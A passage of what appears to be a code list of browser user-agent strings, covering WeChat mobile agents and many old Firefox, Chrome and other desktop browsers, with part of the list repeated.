	 "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
